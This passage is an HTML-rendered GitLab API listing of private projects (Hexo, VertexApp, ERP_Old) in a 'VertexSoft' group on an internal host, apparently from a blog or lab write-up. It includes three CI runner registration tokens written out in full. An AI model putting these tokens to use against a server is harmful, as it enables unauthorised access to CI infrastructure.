&quot;empty_repo&quot;: false,</span><br><span class="line">        &quot;archived&quot;: false,</span><br><span class="line">        &quot;visibility&quot;: &quot;private&quot;,</span><br><span class="line">        &quot;resolve_outdated_diff_discussions&quot;: false,</span><br><span class="line">        &quot;container_expiration_policy&quot;: &#123;</span><br><span class="line">            &quot;cadence&quot;: &quot;1d&quot;,</span><br><span class="line">            &quot;enabled&quot;: false,</span><br><span class="line">            &quot;keep_n&quot;: 10,</span><br><span class="line">            &quot;older_than&quot;: &quot;90d&quot;,</span><br><span class="line">            &quot;name_regex&quot;: &quot;.*&quot;,</span><br><span class="line">            &quot;name_regex_keep&quot;: null,</span><br><span class="line">            &quot;next_run_at&quot;: &quot;2024-07-12T17:03:43.667Z&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;repository_object_format&quot;: &quot;sha1&quot;,</span><br><span class="line">        &quot;issues_enabled&quot;: true,</span><br><span class="line">        &quot;merge_requests_enabled&quot;: true,</span><br><span class="line">        &quot;wiki_enabled&quot;: true,</span><br><span class="line">        &quot;jobs_enabled&quot;: true,</span><br><span class="line">        &quot;snippets_enabled&quot;: true,</span><br><span class="line">        &quot;container_registry_enabled&quot;: true,</span><br><span class="line">        &quot;service_desk_enabled&quot;: false,</span><br><span class="line">        &quot;service_desk_address&quot;: null,</span><br><span class="line">        &quot;can_create_merge_request_in&quot;: true,</span><br><span class="line">        &quot;issues_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;repository_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;merge_requests_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;forking_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;wiki_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;builds_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;snippets_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;pages_access_level&quot;: &quot;private&quot;,</span><br><span class="line">        &quot;analytics_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;container_registry_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;security_and_compliance_access_level&quot;: &quot;private&quot;,</span><br><span class="line">        &quot;releases_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;environments_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;feature_flags_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;infrastructure_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;monitor_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;model_experiments_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;model_registry_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;emails_disabled&quot;: false,</span><br><span class="line">        &quot;emails_enabled&quot;: true,</span><br><span class="line">        &quot;shared_runners_enabled&quot;: true,</span><br><span class="line">        &quot;lfs_enabled&quot;: true,</span><br><span class="line">        &quot;creator_id&quot;: 1,</span><br><span class="line">        &quot;import_url&quot;: null,</span><br><span class="line">        &quot;import_type&quot;: null,</span><br><span class="line">        &quot;import_status&quot;: &quot;none&quot;,</span><br><span class="line">        &quot;open_issues_count&quot;: 0,</span><br><span class="line">        &quot;description_html&quot;: &quot;&quot;,</span><br><span class="line">        &quot;updated_at&quot;: &quot;2024-07-17T05:42:29.243Z&quot;,</span><br><span class="line">        &quot;ci_default_git_depth&quot;: 20,</span><br><span class="line">        &quot;ci_forward_deployment_enabled&quot;: true,</span><br><span class="line">        &quot;ci_forward_deployment_rollback_allowed&quot;: true,</span><br><span class="line">        &quot;ci_job_token_scope_enabled&quot;: false,</span><br><span class="line">        &quot;ci_separated_caches&quot;: true,</span><br><span class="line">        &quot;ci_allow_fork_pipelines_to_run_in_parent_project&quot;: true,</span><br><span class="line">        &quot;build_git_strategy&quot;: &quot;fetch&quot;,</span><br><span class="line">        &quot;keep_latest_artifact&quot;: true,</span><br><span class="line">        &quot;restrict_user_defined_variables&quot;: false,</span><br><span class="line">        &quot;runners_token&quot;: &quot;GR1348941cVxxrGfbYCRyHzGyNtRE&quot;,</span><br><span class="line">        &quot;runner_token_expiration_interval&quot;: null,</span><br><span class="line">        &quot;group_runners_enabled&quot;: true,</span><br><span class="line">        &quot;auto_cancel_pending_pipelines&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;build_timeout&quot;: 3600,</span><br><span class="line">        &quot;auto_devops_enabled&quot;: true,</span><br><span class="line">        &quot;auto_devops_deploy_strategy&quot;: &quot;continuous&quot;,</span><br><span class="line">        &quot;ci_config_path&quot;: null,</span><br><span class="line">        &quot;public_jobs&quot;: true,</span><br><span class="line">        &quot;shared_with_groups&quot;: [],</span><br><span class="line">        &quot;only_allow_merge_if_pipeline_succeeds&quot;: false,</span><br><span class="line">        &quot;allow_merge_on_skipped_pipeline&quot;: null,</span><br><span class="line">        &quot;request_access_enabled&quot;: true,</span><br><span class="line">        &quot;only_allow_merge_if_all_discussions_are_resolved&quot;: false,</span><br><span class="line">        &quot;remove_source_branch_after_merge&quot;: true,</span><br><span class="line">        &quot;printing_merge_request_link_enabled&quot;: true,</span><br><span class="line">        &quot;merge_method&quot;: &quot;merge&quot;,</span><br><span class="line">        &quot;squash_option&quot;: &quot;default_off&quot;,</span><br><span class="line">        &quot;enforce_auth_checks_on_uploads&quot;: true,</span><br><span class="line">        &quot;suggestion_commit_message&quot;: null,</span><br><span class="line">        &quot;merge_commit_template&quot;: null,</span><br><span class="line">        &quot;squash_commit_template&quot;: null,</span><br><span class="line">        &quot;issue_branch_template&quot;: null,</span><br><span class="line">        &quot;warn_about_potentially_unwanted_characters&quot;: true,</span><br><span class="line">        &quot;autoclose_referenced_issues&quot;: true,</span><br><span class="line">        &quot;permissions&quot;: &#123;</span><br><span class="line">            &quot;project_access&quot;: null,</span><br><span class="line">            &quot;group_access&quot;: &#123;</span><br><span class="line">                &quot;access_level&quot;: 50,</span><br><span class="line">                &quot;notification_level&quot;: 3</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;id&quot;: 4,</span><br><span class="line">        &quot;description&quot;: &quot;Hexo&quot;,</span><br><span class="line">        &quot;name&quot;: &quot;Hexo&quot;,</span><br><span class="line">        &quot;name_with_namespace&quot;: &quot;VertexSoft / Hexo&quot;,</span><br><span class="line">        &quot;path&quot;: &quot;hexo&quot;,</span><br><span class="line">        &quot;path_with_namespace&quot;: &quot;vertexsoft/hexo&quot;,</span><br><span class="line">        &quot;created_at&quot;: &quot;2024-07-11T17:01:31.691Z&quot;,</span><br><span class="line">        &quot;default_branch&quot;: &quot;master&quot;,</span><br><span class="line">        &quot;tag_list&quot;: [],</span><br><span class="line">        &quot;topics&quot;: [],</span><br><span class="line">        &quot;ssh_url_to_repo&quot;: &quot;git@192.168.8.42:vertexsoft/hexo.git&quot;,</span><br><span class="line">        &quot;http_url_to_repo&quot;: &quot;http://192.168.8.42/vertexsoft/hexo.git&quot;,</span><br><span class="line">        &quot;web_url&quot;: &quot;http://192.168.8.42/vertexsoft/hexo&quot;,</span><br><span class="line">        &quot;readme_url&quot;: &quot;http://192.168.8.42/vertexsoft/hexo/-/blob/master/README.md&quot;,</span><br><span class="line">        &quot;forks_count&quot;: 0,</span><br><span class="line">        &quot;avatar_url&quot;: null,</span><br><span class="line">        &quot;star_count&quot;: 0,</span><br><span class="line">        &quot;last_activity_at&quot;: &quot;2024-07-11T17:01:31.661Z&quot;,</span><br><span class="line">        &quot;namespace&quot;: &#123;</span><br><span class="line">            &quot;id&quot;: 2,</span><br><span class="line">            &quot;name&quot;: &quot;VertexSoft&quot;,</span><br><span class="line">            &quot;path&quot;: &quot;vertexsoft&quot;,</span><br><span class="line">            &quot;kind&quot;: &quot;group&quot;,</span><br><span class="line">            &quot;full_path&quot;: &quot;vertexsoft&quot;,</span><br><span class="line">            &quot;parent_id&quot;: null,</span><br><span class="line">            &quot;avatar_url&quot;: null,</span><br><span class="line">            &quot;web_url&quot;: &quot;http://192.168.8.42/groups/vertexsoft&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;repository_storage&quot;: &quot;default&quot;,</span><br><span class="line">        &quot;_links&quot;: &#123;</span><br><span class="line">            &quot;self&quot;: &quot;http://192.168.8.42/api/v4/projects/4&quot;,</span><br><span class="line">            &quot;issues&quot;: &quot;http://192.168.8.42/api/v4/projects/4/issues&quot;,</span><br><span class="line">            &quot;merge_requests&quot;: &quot;http://192.168.8.42/api/v4/projects/4/merge_requests&quot;,</span><br><span class="line">            &quot;repo_branches&quot;: &quot;http://192.168.8.42/api/v4/projects/4/repository/branches&quot;,</span><br><span class="line">            &quot;labels&quot;: &quot;http://192.168.8.42/api/v4/projects/4/labels&quot;,</span><br><span class="line">            &quot;events&quot;: &quot;http://192.168.8.42/api/v4/projects/4/events&quot;,</span><br><span class="line">            &quot;members&quot;: &quot;http://192.168.8.42/api/v4/projects/4/members&quot;,</span><br><span class="line">            &quot;cluster_agents&quot;: &quot;http://192.168.8.42/api/v4/projects/4/cluster_agents&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;packages_enabled&quot;: true,</span><br><span class="line">        &quot;empty_repo&quot;: false,</span><br><span class="line">        &quot;archived&quot;: false,</span><br><span class="line">        &quot;visibility&quot;: &quot;private&quot;,</span><br><span class="line">        &quot;resolve_outdated_diff_discussions&quot;: false,</span><br><span class="line">        &quot;container_expiration_policy&quot;: &#123;</span><br><span class="line">            &quot;cadence&quot;: &quot;1d&quot;,</span><br><span class="line">            &quot;enabled&quot;: false,</span><br><span class="line">            &quot;keep_n&quot;: 10,</span><br><span class="line">            &quot;older_than&quot;: &quot;90d&quot;,</span><br><span class="line">            &quot;name_regex&quot;: &quot;.*&quot;,</span><br><span class="line">            &quot;name_regex_keep&quot;: null,</span><br><span class="line">            &quot;next_run_at&quot;: &quot;2024-07-12T17:01:32.184Z&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;repository_object_format&quot;: &quot;sha1&quot;,</span><br><span class="line">        &quot;issues_enabled&quot;: true,</span><br><span class="line">        &quot;merge_requests_enabled&quot;: true,</span><br><span class="line">        &quot;wiki_enabled&quot;: true,</span><br><span class="line">        &quot;jobs_enabled&quot;: true,</span><br><span class="line">        &quot;snippets_enabled&quot;: true,</span><br><span class="line">        &quot;container_registry_enabled&quot;: true,</span><br><span class="line">        &quot;service_desk_enabled&quot;: false,</span><br><span class="line">        &quot;service_desk_address&quot;: null,</span><br><span class="line">        &quot;can_create_merge_request_in&quot;: true,</span><br><span class="line">        &quot;issues_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;repository_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;merge_requests_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;forking_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;wiki_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;builds_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;snippets_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;pages_access_level&quot;: &quot;private&quot;,</span><br><span class="line">        &quot;analytics_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;container_registry_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;security_and_compliance_access_level&quot;: &quot;private&quot;,</span><br><span class="line">        &quot;releases_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;environments_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;feature_flags_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;infrastructure_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;monitor_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;model_experiments_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;model_registry_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;emails_disabled&quot;: false,</span><br><span class="line">        &quot;emails_enabled&quot;: true,</span><br><span class="line">        &quot;shared_runners_enabled&quot;: true,</span><br><span class="line">        &quot;lfs_enabled&quot;: true,</span><br><span class="line">        &quot;creator_id&quot;: 1,</span><br><span class="line">        &quot;import_url&quot;: null,</span><br><span class="line">        &quot;import_type&quot;: &quot;gitlab_project&quot;,</span><br><span class="line">        &quot;import_status&quot;: &quot;finished&quot;,</span><br><span class="line">        &quot;open_issues_count&quot;: 0,</span><br><span class="line">        &quot;description_html&quot;: &quot;&lt;p data-sourcepos=\&quot;1:1-1:4\&quot; dir=\&quot;auto\&quot;&gt;Hexo&lt;/p&gt;&quot;,</span><br><span class="line">        &quot;updated_at&quot;: &quot;2024-07-11T17:01:32.535Z&quot;,</span><br><span class="line">        &quot;ci_default_git_depth&quot;: 20,</span><br><span class="line">        &quot;ci_forward_deployment_enabled&quot;: true,</span><br><span class="line">        &quot;ci_forward_deployment_rollback_allowed&quot;: true,</span><br><span class="line">        &quot;ci_job_token_scope_enabled&quot;: false,</span><br><span class="line">        &quot;ci_separated_caches&quot;: true,</span><br><span class="line">        &quot;ci_allow_fork_pipelines_to_run_in_parent_project&quot;: true,</span><br><span class="line">        &quot;build_git_strategy&quot;: &quot;fetch&quot;,</span><br><span class="line">        &quot;keep_latest_artifact&quot;: true,</span><br><span class="line">        &quot;restrict_user_defined_variables&quot;: false,</span><br><span class="line">        &quot;runners_token&quot;: &quot;GR1348941CyxAy3dnsudA95t35ucx&quot;,</span><br><span class="line">        &quot;runner_token_expiration_interval&quot;: null,</span><br><span class="line">        &quot;group_runners_enabled&quot;: true,</span><br><span class="line">        &quot;auto_cancel_pending_pipelines&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;build_timeout&quot;: 3600,</span><br><span class="line">        &quot;auto_devops_enabled&quot;: true,</span><br><span class="line">        &quot;auto_devops_deploy_strategy&quot;: &quot;continuous&quot;,</span><br><span class="line">        &quot;ci_config_path&quot;: null,</span><br><span class="line">        &quot;public_jobs&quot;: true,</span><br><span class="line">        &quot;shared_with_groups&quot;: [],</span><br><span class="line">        &quot;only_allow_merge_if_pipeline_succeeds&quot;: false,</span><br><span class="line">        &quot;allow_merge_on_skipped_pipeline&quot;: null,</span><br><span class="line">        &quot;request_access_enabled&quot;: true,</span><br><span class="line">        &quot;only_allow_merge_if_all_discussions_are_resolved&quot;: false,</span><br><span class="line">        &quot;remove_source_branch_after_merge&quot;: true,</span><br><span class="line">        &quot;printing_merge_request_link_enabled&quot;: true,</span><br><span class="line">        &quot;merge_method&quot;: &quot;merge&quot;,</span><br><span class="line">        &quot;squash_option&quot;: &quot;default_off&quot;,</span><br><span class="line">        &quot;enforce_auth_checks_on_uploads&quot;: true,</span><br><span class="line">        &quot;suggestion_commit_message&quot;: null,</span><br><span class="line">        &quot;merge_commit_template&quot;: null,</span><br><span class="line">        &quot;squash_commit_template&quot;: null,</span><br><span class="line">        &quot;issue_branch_template&quot;: null,</span><br><span class="line">        &quot;warn_about_potentially_unwanted_characters&quot;: true,</span><br><span class="line">        &quot;autoclose_referenced_issues&quot;: true,</span><br><span class="line">        &quot;permissions&quot;: &#123;</span><br><span class="line">            &quot;project_access&quot;: &#123;</span><br><span class="line">                &quot;access_level&quot;: 40,</span><br><span class="line">                &quot;notification_level&quot;: null</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;group_access&quot;: &#123;</span><br><span class="line">                &quot;access_level&quot;: 50,</span><br><span class="line">                &quot;notification_level&quot;: 3</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;id&quot;: 3,</span><br><span class="line">        &quot;description&quot;: &quot;VertexSoft Internal Employee Service App&quot;,</span><br><span class="line">        &quot;name&quot;: &quot;VertexApp&quot;,</span><br><span class="line">        &quot;name_with_namespace&quot;: &quot;VertexSoft / VertexApp&quot;,</span><br><span class="line">        &quot;path&quot;: &quot;vertexapp&quot;,</span><br><span class="line">        &quot;path_with_namespace&quot;: &quot;vertexsoft/vertexapp&quot;,</span><br><span class="line">        &quot;created_at&quot;: &quot;2024-07-11T17:00:59.905Z&quot;,</span><br><span class="line">        &quot;default_branch&quot;: &quot;master&quot;,</span><br><span class="line">        &quot;tag_list&quot;: [],</span><br><span class="line">        &quot;topics&quot;: [],</span><br><span class="line">        &quot;ssh_url_to_repo&quot;: &quot;git@192.168.8.42:vertexsoft/vertexapp.git&quot;,</span><br><span class="line">        &quot;http_url_to_repo&quot;: &quot;http://192.168.8.42/vertexsoft/vertexapp.git&quot;,</span><br><span class="line">        &quot;web_url&quot;: &quot;http://192.168.8.42/vertexsoft/vertexapp&quot;,</span><br><span class="line">        &quot;readme_url&quot;: &quot;http://192.168.8.42/vertexsoft/vertexapp/-/blob/master/README.md&quot;,</span><br><span class="line">        &quot;forks_count&quot;: 0,</span><br><span class="line">        &quot;avatar_url&quot;: null,</span><br><span class="line">        &quot;star_count&quot;: 0,</span><br><span class="line">        &quot;last_activity_at&quot;: &quot;2024-07-11T17:00:59.877Z&quot;,</span><br><span class="line">        &quot;namespace&quot;: &#123;</span><br><span class="line">            &quot;id&quot;: 2,</span><br><span class="line">            &quot;name&quot;: &quot;VertexSoft&quot;,</span><br><span class="line">            &quot;path&quot;: &quot;vertexsoft&quot;,</span><br><span class="line">            &quot;kind&quot;: &quot;group&quot;,</span><br><span class="line">            &quot;full_path&quot;: &quot;vertexsoft&quot;,</span><br><span class="line">            &quot;parent_id&quot;: null,</span><br><span class="line">            &quot;avatar_url&quot;: null,</span><br><span class="line">            &quot;web_url&quot;: &quot;http://192.168.8.42/groups/vertexsoft&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;repository_storage&quot;: &quot;default&quot;,</span><br><span class="line">        &quot;_links&quot;: &#123;</span><br><span class="line">            &quot;self&quot;: &quot;http://192.168.8.42/api/v4/projects/3&quot;,</span><br><span class="line">            &quot;issues&quot;: &quot;http://192.168.8.42/api/v4/projects/3/issues&quot;,</span><br><span class="line">            &quot;merge_requests&quot;: &quot;http://192.168.8.42/api/v4/projects/3/merge_requests&quot;,</span><br><span class="line">            &quot;repo_branches&quot;: &quot;http://192.168.8.42/api/v4/projects/3/repository/branches&quot;,</span><br><span class="line">            &quot;labels&quot;: &quot;http://192.168.8.42/api/v4/projects/3/labels&quot;,</span><br><span class="line">            &quot;events&quot;: &quot;http://192.168.8.42/api/v4/projects/3/events&quot;,</span><br><span class="line">            &quot;members&quot;: &quot;http://192.168.8.42/api/v4/projects/3/members&quot;,</span><br><span class="line">            &quot;cluster_agents&quot;: &quot;http://192.168.8.42/api/v4/projects/3/cluster_agents&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;packages_enabled&quot;: true,</span><br><span class="line">        &quot;empty_repo&quot;: false,</span><br><span class="line">        &quot;archived&quot;: false,</span><br><span class="line">        &quot;visibility&quot;: &quot;private&quot;,</span><br><span class="line">        &quot;resolve_outdated_diff_discussions&quot;: false,</span><br><span class="line">        &quot;container_expiration_policy&quot;: &#123;</span><br><span class="line">            &quot;cadence&quot;: &quot;1d&quot;,</span><br><span class="line">            &quot;enabled&quot;: false,</span><br><span class="line">            &quot;keep_n&quot;: 10,</span><br><span class="line">            &quot;older_than&quot;: &quot;90d&quot;,</span><br><span class="line">            &quot;name_regex&quot;: &quot;.*&quot;,</span><br><span class="line">            &quot;name_regex_keep&quot;: null,</span><br><span class="line">            &quot;next_run_at&quot;: &quot;2024-07-12T17:01:00.306Z&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;repository_object_format&quot;: &quot;sha1&quot;,</span><br><span class="line">        &quot;issues_enabled&quot;: true,</span><br><span class="line">        &quot;merge_requests_enabled&quot;: true,</span><br><span class="line">        &quot;wiki_enabled&quot;: true,</span><br><span class="line">        &quot;jobs_enabled&quot;: true,</span><br><span class="line">        &quot;snippets_enabled&quot;: true,</span><br><span class="line">        &quot;container_registry_enabled&quot;: true,</span><br><span class="line">        &quot;service_desk_enabled&quot;: false,</span><br><span class="line">        &quot;service_desk_address&quot;: null,</span><br><span class="line">        &quot;can_create_merge_request_in&quot;: true,</span><br><span class="line">        &quot;issues_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;repository_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;merge_requests_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;forking_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;wiki_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;builds_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;snippets_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;pages_access_level&quot;: &quot;private&quot;,</span><br><span class="line">        &quot;analytics_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;container_registry_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;security_and_compliance_access_level&quot;: &quot;private&quot;,</span><br><span class="line">        &quot;releases_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;environments_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;feature_flags_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;infrastructure_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;monitor_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;model_experiments_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;model_registry_access_level&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;emails_disabled&quot;: false,</span><br><span class="line">        &quot;emails_enabled&quot;: true,</span><br><span class="line">        &quot;shared_runners_enabled&quot;: true,</span><br><span class="line">        &quot;lfs_enabled&quot;: true,</span><br><span class="line">        &quot;creator_id&quot;: 1,</span><br><span class="line">        &quot;import_url&quot;: null,</span><br><span class="line">        &quot;import_type&quot;: &quot;gitlab_project&quot;,</span><br><span class="line">        &quot;import_status&quot;: &quot;finished&quot;,</span><br><span class="line">        &quot;open_issues_count&quot;: 0,</span><br><span class="line">        &quot;description_html&quot;: &quot;&lt;p data-sourcepos=\&quot;1:1-1:40\&quot; dir=\&quot;auto\&quot;&gt;VertexSoft Internal Employee Service App&lt;/p&gt;&quot;,</span><br><span class="line">        &quot;updated_at&quot;: &quot;2024-07-11T17:01:00.622Z&quot;,</span><br><span class="line">        &quot;ci_default_git_depth&quot;: 20,</span><br><span class="line">        &quot;ci_forward_deployment_enabled&quot;: true,</span><br><span class="line">        &quot;ci_forward_deployment_rollback_allowed&quot;: true,</span><br><span class="line">        &quot;ci_job_token_scope_enabled&quot;: false,</span><br><span class="line">        &quot;ci_separated_caches&quot;: true,</span><br><span class="line">        &quot;ci_allow_fork_pipelines_to_run_in_parent_project&quot;: true,</span><br><span class="line">        &quot;build_git_strategy&quot;: &quot;fetch&quot;,</span><br><span class="line">        &quot;keep_latest_artifact&quot;: true,</span><br><span class="line">        &quot;restrict_user_defined_variables&quot;: false,</span><br><span class="line">        &quot;runners_token&quot;: &quot;GR1348941nmFUY2NxrQoLyDNnGYPx&quot;,</span><br><span class="line">        &quot;runner_token_expiration_interval&quot;: null,</span><br><span class="line">        &quot;group_runners_enabled&quot;: true,</span><br><span class="line">        &quot;auto_cancel_pending_pipelines&quot;: &quot;enabled&quot;,</span><br><span class="line">        &quot;build_timeout&quot;: 3600,</span><br><span class="line">        &quot;auto_devops_enabled&quot;: true,</span><br><span class="line">        &quot;auto_devops_deploy_strategy&quot;: &quot;continuous&quot;,</span><br><span class="line">        &quot;ci_config_path&quot;: null,</span><br><span class="line">        &quot;public_jobs&quot;: true,</span><br><span class="line">        &quot;shared_with_groups&quot;: [],</span><br><span class="line">        &quot;only_allow_merge_if_pipeline_succeeds&quot;: false,</span><br><span class="line">        &quot;allow_merge_on_skipped_pipeline&quot;: null,</span><br><span class="line">        &quot;request_access_enabled&quot;: true,</span><br><span class="line">        &quot;only_allow_merge_if_all_discussions_are_resolved&quot;: false,</span><br><span class="line">        &quot;remove_source_branch_after_merge&quot;: true,</span><br><span class="line">        &quot;printing_merge_request_link_enabled&quot;: true,</span><br><span class="line">        &quot;merge_method&quot;: &quot;merge&quot;,</span><br><span class="line">        &quot;squash_option&quot;: &quot;default_off&quot;,</span><br><span class="line">        &quot;enforce_auth_checks_on_uploads&quot;: true,</span><br><span class="line">        &quot;suggestion_commit_message&quot;: null,</span><br><span class="line">        &quot;merge_commit_template&quot;: null,</span><br><span class="line">        &quot;squash_commit_template&quot;: null,</span><br><span class="line">        &quot;issue_branch_template&quot;: null,</span><br><span class="line">        &quot;warn_about_potentially_unwanted_characters&quot;: true,</span><br><span class="line">        &quot;autoclose_referenced_issues&quot;: true,</span><br><span class="line">        &quot;permissions&quot;: &#123;</span><br><span class="line">            &quot;project_access&quot;: &#123;</span><br><span class="line">                &quot;access_level&quot;: 40,</span><br><span class="line">                &quot;notification_level&quot;: null</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;group_access&quot;: &#123;</span><br><span class="line">                &quot;access_level&quot;: 50,</span><br><span class="line">                &quot;notification_level&quot;: 3</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;id&quot;: 2,</span><br><span class="line">        &quot;description&quot;: &quot;VertexSoft&#x27;s old ERP system&quot;,</span><br><span class="line">        &quot;name&quot;: &quot;ERP_Old&quot;,</span><br><span class="line">        &quot;name_with_namespace&quot;: &quot;VertexSoft / ERP_Old&quot;,</span><br><span class="line">        &quot;path&quot;: &quot;erp_old&quot;,</span><br><span class="line">        &quot;path_with_namespace&quot;: &quot;vertexsoft/erp_old&quot;,</span><br><span class="line">        &quot;created_at&quot;: &quot;2024-07-11T17:00:05.051Z&quot;,</span><br><span class="line">        &quot;default_branch&quot;: &quot;master&quot;,</span><br><span class="line">        &quot;tag_list&quot;: [],</span><br><span class="line">        &quot;topics&quot;: [],</span><br><span class="line">        &quot;ssh_url_to_repo&quot;: &quot;git@192.168.8.42:vertexsoft/erp_old.git&quot;,</span><br><span class="line">        &quot;http_url_to_repo&quot;: &quot;http://192.168.8.42/vertexsoft/erp_old.git&quot;,</span><br><span class="line">        &quot;web_url&quot;: &quot;http://192.168.8.42/vertexsoft/erp_old&quot;,</span><br><span class="line">        &quot;readme_url&quot;: &quot;http://192.168.8.42/vertexsoft/erp_old/-/blob/master/README.md&quot;,</span><br><span class="line">        &quot;forks_count&quot;: 0,</span><br><span class="line">        &quot;avatar_url&quot;: null,</span><br><span class="line">        &quot;star_count&quot;: 0,</span><br><span class="line">        &quot;last_activity_at&quot;: &quot;2024-07-11T17:00:05.004Z&quot;,</span><br><span class="line">        &quot;namespace&quot;: &#123;</span><br><span class="line">            &quot;id&quot;: 2,</span><br><span class="line">            &quot;name&quot;: &quot;VertexSoft&quot;,</span><br><span class="line">            &quot;path&quot;: &quot;vertexsoft&quot;,</span><br><span class="line">            &quot;kind&quot;: &quot;group&quot;,</span><br><span class="line">            &quot;full_path&quot;: &quot;vertexsoft&quot;,</span><br><span class="line">            &quot;parent_id&quot;: null,</span><br><span class="line">            &quot;avatar_url&quot;: null,</span><br><span class="line">            &quot;web_url&quot;: &quot;http://192.168.8.42/groups/vertexsoft&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;repository_storage&quot;: &quot;default&quot;,</span><br><span class="line">        &quot;_links&quot;: &#123;</span><br><span class="line">            &quot;self&quot;: &quot;http://192.168.8.42/api/v4/projects/2&quot;,</span><br><span class="line">            &quot;issues&quot;: &quot;http://192.168.8.42/api/v4/projects/2/issues&quot;,</span><br><span class="line">            &quot;merge_requests&quot;: &quot;http://192.168.8.42/api/v4/projects/2/merge_requests&quot;,</span><br><span class="line">            &quot;repo_branches&quot;: &quot;http://192.168.8.42/api/v4/projects/2/repository/branches&quot;,</span><br><span class="line">            &quot;labels&quot;: &quot;http://192.168.8.42/api/v4/projects/2/labels&quot;,</span><br><span class="line">            &quot;events&quot;: &quot;http://192.168.8.42/api/v4/projects/2/events&quot;,</span><br><span class="line">            &quot;members&quot;: &quot;http://192.168.8.42/api/v4/projects/2/members&quot;,</span><br><span class="line">            &quot;cluster_agents&quot;: &quot;http://192.168.8.42/api/v4/projects/2/cluster_agents&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;packages_enabled&quot;: true,</span><br><span class="line">        &quot;empty_repo&quot;: false,</span><br><span class="line">        &quot;archived&quot;: false,</span><br><span class="line">        &quot;visibility&quot;: &quot;private&quot;,</span><br><span class="line">        &quot;resolve_outdated_diff_discussions&quot;: false,</span><br><span class="line">        &quot;container_expiration_policy&quot;: &#123;</span><br><span class="line">            &quot;cadence&quot;: &quot;1d&quot;,</span><br><span class="line">            &quot;enabled&quot;: false,</span><br><span class="line">            &quot;keep_n&quot;: 10,</span><br><span class="line">            &quot;older_than&quot;: &quot;90d&quot;,</span><br><span class="line">            &quot;name_regex&quot;: &quot;.*&quot;,</span><br><span class="line">            &quot;name_regex_keep&quot;: null,</span><br><span class="line">            &quot;next_run_at&quot;: &quot;2024-07-12T17:00:07.041Z&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;repository_object_format&quot;: &quot;sha1&quot;,</span><br><span class="line">        &quot;issues_enabled&quot;: true,</span><br><span class="line">        &quot;merge_requests_enabled&quot;: true,</span><br><span class="line">        &quot;wiki_enabled&quot;: true,</span><br><span class="line">        &quot;jobs_enabled&quot;: true,</span><br><span 